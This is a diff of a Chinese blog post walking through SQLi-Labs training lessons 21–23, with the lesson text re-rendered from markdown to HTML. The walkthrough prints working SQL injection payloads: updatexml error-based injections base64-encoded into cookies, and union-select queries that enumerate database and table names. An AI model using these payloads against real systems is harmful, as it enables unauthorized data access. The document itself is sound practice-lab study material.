@@ -19,13 +19,25 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="道阻且长，行则将至">
-    <meta name="description" content="![](https:&#x2F;&#x2F;gitee.com&#x2F;n0usss&#x2F;my-pictures&#x2F;raw&#x2F;master&#x2F;pics&#x2F;202210242135027.png) # Lesson 21 **Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）** 今天开始sqli-l">
+    <meta name="description" content="Lesson 21Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLi-Labs靶场刷题记录【Adv Challenges】">
 <meta property="og:url" content="http://r4x.top/2022/11/16/SQLi-Labs%20Adv%20Challenges/index.html">
 <meta property="og:site_name" content="R4x&#39;s Blog">
-<meta property="og:description" content="![](https:&#x2F;&#x2F;gitee.com&#x2F;n0usss&#x2F;my-pictures&#x2F;raw&#x2F;master&#x2F;pics&#x2F;202210242135027.png) # Lesson 21 **Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）** 今天开始sqli-l">
+<meta property="og:description" content="Lesson 21Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png">
+<meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png">
 <meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032117869.png">
 <meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032208178.png">
 <meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032209721.png">
@@ -70,11 +82,11 @@
 <meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009090.png">
 <meta property="og:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009242.png">
 <meta property="article:published_time" content="2022-11-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-21T01:39:40.095Z">
+<meta property="article:modified_time" content="2022-11-21T01:43:19.232Z">
 <meta property="article:author" content="R4x">
 <meta property="article:tag" content="Security">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032117869.png">
+<meta name="twitter:image" content="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -375,7 +387,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.3k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -536,53 +548,30 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-         <meta name="referrer" content="no-referrer" />
- ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png)
-# Lesson 21
-**Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）**
-今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png)
-输入`admin:admin(username:password)`：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png)
-和前面的题差不多，显示出了Http包中的一些信息，burp抓包：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png)
-可以在这里看到base64编码后的cookie头，解码后的结果如下：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png)
-这样思路就有了：构造payload->base64编码->重放，根据之前的题目，尝试构造一下updatexml的报错注入：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) -- (注意最后还有个空格)</span><br></pre></td></tr></table></figure>
-编码后：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSA=</span><br></pre></td></tr></table></figure>
-重放：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png)
-可以看到爆出了信息，其余的和之前的类似
-# Lesson 22
-**Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)**
-根据标题，先尝试将Lesson21的单引号改为双引号：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
-Base64编码：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIC0tIA==</span><br></pre></td></tr></table></figure>
-成功：
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png)
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png)
-其余与之前类似
-# Lesson 23
-**GET - Error based - strip comments (基于错误的，过滤注释的GET型)**
-根据标题可以知道肯定是过滤了注释符号，试一下单引号：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png)
-发现报错，尝试闭合语句：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png)
-并没有报错，猜一下列名：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
-爆数据库名：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png)
-表名：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png)
-剩下的就和前面一样了，当然这里也可以使用`updatexml()`报错注入
+        <meta name="referrer" content="no-referrer" />
 
+<p> <img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png"></p>
+<h1 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h1><p><strong>Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）</strong><br>今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png"><br>输入<code>admin:admin(username:password)</code>：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png"><br>和前面的题差不多，显示出了Http包中的一些信息，burp抓包：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png"><br>可以在这里看到base64编码后的cookie头，解码后的结果如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png"><br>这样思路就有了：构造payload-&gt;base64编码-&gt;重放，根据之前的题目，尝试构造一下updatexml的报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) -- (注意最后还有个空格)</span><br></pre></td></tr></table></figure>
+<p>编码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSA=</span><br></pre></td></tr></table></figure>
+<p>重放：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png"><br>可以看到爆出了信息，其余的和之前的类似</p>
+<h1 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h1><p><strong>Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</strong><br>根据标题，先尝试将Lesson21的单引号改为双引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
+<p>Base64编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIC0tIA==</span><br></pre></td></tr></table></figure>
+<p>成功：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png"><br>其余与之前类似</p>
+<h1 id="Lesson-23"><a href="#Lesson-23" class="headerlink" title="Lesson 23"></a>Lesson 23</h1><p><strong>GET - Error based - strip comments (基于错误的，过滤注释的GET型)</strong><br>根据标题可以知道肯定是过滤了注释符号，试一下单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png"><br>发现报错，尝试闭合语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png"><br>并没有报错，猜一下列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p>爆数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png"><br>表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3 and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png"><br>剩下的就和前面一样了，当然这里也可以使用<code>updatexml()</code>报错注入</p>
 <h1 id="Lesson-24"><a href="#Lesson-24" class="headerlink" title="Lesson 24"></a>Lesson 24</h1><p><strong>Second Degree Injections Real treat -Store Injections (二次注入)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211032117869.png"><br>根据题目，发现考察的是二次注入，有关二次注入的知识，参考这篇文章：</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/</a></p>
@@ -849,7 +838,7 @@ Base64编码：
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-24"><span class="toc-number">1.</span> <span class="toc-text">Lesson 24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25"><span class="toc-number">2.</span> <span class="toc-text">Lesson 25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25a"><span class="toc-number">3.</span> <span class="toc-text">Lesson 25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26"><span class="toc-number">4.</span> <span class="toc-text">Lesson 26</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">库名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">4.1.2.</span> <span class="toc-text">表名：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26a"><span class="toc-number">5.</span> <span class="toc-text">Lesson 26a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27"><span class="toc-number">6.</span> <span class="toc-text">Lesson 27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27a"><span class="toc-number">7.</span> <span class="toc-text">Lesson 27a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28"><span class="toc-number">8.</span> <span class="toc-text">Lesson 28</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-1"><span class="toc-number">8.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28a"><span class="toc-number">9.</span> <span class="toc-text">Lesson 28a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-2"><span class="toc-number">9.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-29"><span class="toc-number">10.</span> <span class="toc-text">Lesson 29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-30-31"><span class="toc-number">11.</span> <span class="toc-text">Lesson 30~31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-32"><span class="toc-number">12.</span> <span class="toc-text">Lesson 32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-33"><span class="toc-number">13.</span> <span class="toc-text">Lesson 33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-34"><span class="toc-number">14.</span> <span class="toc-text">Lesson 34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-35"><span class="toc-number">15.</span> <span class="toc-text">Lesson 35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-36"><span class="toc-number">16.</span> <span class="toc-text">Lesson 36</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-real-escape-string-%E5%87%BD%E6%95%B0"><span class="toc-number">16.1.</span> <span class="toc-text">mysql-real-escape-string()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">16.1.1.</span> <span class="toc-text">语法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-37"><span class="toc-number">17.</span> <span class="toc-text">Lesson 37</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-21"><span class="toc-number">1.</span> <span class="toc-text">Lesson 21</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-22"><span class="toc-number">2.</span> <span class="toc-text">Lesson 22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-23"><span class="toc-number">3.</span> <span class="toc-text">Lesson 23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-24"><span class="toc-number">4.</span> <span class="toc-text">Lesson 24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25"><span class="toc-number">5.</span> <span class="toc-text">Lesson 25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-25a"><span class="toc-number">6.</span> <span class="toc-text">Lesson 25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26"><span class="toc-number">7.</span> <span class="toc-text">Lesson 26</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%EF%BC%9A"><span class="toc-number">7.1.1.</span> <span class="toc-text">库名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D%EF%BC%9A"><span class="toc-number">7.1.2.</span> <span class="toc-text">表名：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-26a"><span class="toc-number">8.</span> <span class="toc-text">Lesson 26a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27"><span class="toc-number">9.</span> <span class="toc-text">Lesson 27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-27a"><span class="toc-number">10.</span> <span class="toc-text">Lesson 27a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28"><span class="toc-number">11.</span> <span class="toc-text">Lesson 28</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-1"><span class="toc-number">11.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-28a"><span class="toc-number">12.</span> <span class="toc-text">Lesson 28a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81-2"><span class="toc-number">12.1.</span> <span class="toc-text">过滤代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-29"><span class="toc-number">13.</span> <span class="toc-text">Lesson 29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-30-31"><span class="toc-number">14.</span> <span class="toc-text">Lesson 30~31</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-32"><span class="toc-number">15.</span> <span class="toc-text">Lesson 32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-33"><span class="toc-number">16.</span> <span class="toc-text">Lesson 33</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-34"><span class="toc-number">17.</span> <span class="toc-text">Lesson 34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-35"><span class="toc-number">18.</span> <span class="toc-text">Lesson 35</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-36"><span class="toc-number">19.</span> <span class="toc-text">Lesson 36</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-real-escape-string-%E5%87%BD%E6%95%B0"><span class="toc-number">19.1.</span> <span class="toc-text">mysql-real-escape-string()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">19.1.1.</span> <span class="toc-text">语法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lesson-37"><span class="toc-number">20.</span> <span class="toc-text">Lesson 37</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
